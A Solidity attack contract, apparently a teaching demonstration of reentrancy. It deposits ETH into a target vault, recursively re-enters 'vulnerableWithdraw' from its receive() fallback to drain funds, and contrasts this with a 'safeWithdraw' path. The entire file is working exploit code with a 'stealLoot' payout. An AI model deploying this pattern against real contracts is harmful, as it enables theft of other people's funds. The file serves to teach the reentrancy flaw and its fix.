// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
    function goldBalance(address) external view returns (uint256);
}

contract GoldThief {

    IVault public targetVault;
    address public owner;
    uint256 public attackCount;
    bool public attackingSafe;
    uint256 public maxAttackRounds;

    event AttackStarted(bool targetSafeWithdraw, uint256 depositAmount);
    event AttackLoop(uint256 round, uint256 vaultBalance);
    event LootClaimed(uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor(address _vaultAddress, uint256 _maxAttackRounds) {
        require(_vaultAddress != address(0), "Invalid vault address");
        require(_maxAttackRounds > 0 && _maxAttackRounds <= 10, "Rounds must be 1-10");
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
        maxAttackRounds = _maxAttackRounds;
    }

    function setMaxAttackRounds(uint256 _rounds) external onlyOwner {
        require(_rounds > 0 && _rounds <= 10, "Rounds must be 1-10");
        maxAttackRounds = _rounds;
    }

    function attackVulnerable() external payable onlyOwner {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        attackingSafe = false;
        attackCount = 0;

        emit AttackStarted(false, msg.value);

        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    function attackSafe() external payable onlyOwner {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        attackingSafe = true;
        attackCount = 0;

        emit AttackStarted(true, msg.value);

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    receive() external payable {
        attackCount++;
        emit AttackLoop(attackCount, address(targetVault).balance);

        if (!attackingSafe) {
            if (
                address(targetVault).balance >= 1 ether &&
                attackCount < maxAttackRounds
            ) {
                targetVault.vulnerableWithdraw();
            }
        } else {
            try targetVault.safeWithdraw() {
            } catch {
            }
        }
    }

    function stealLoot() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "No loot to steal");
        payable(owner).transfer(bal);
        emit LootClaimed(bal);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
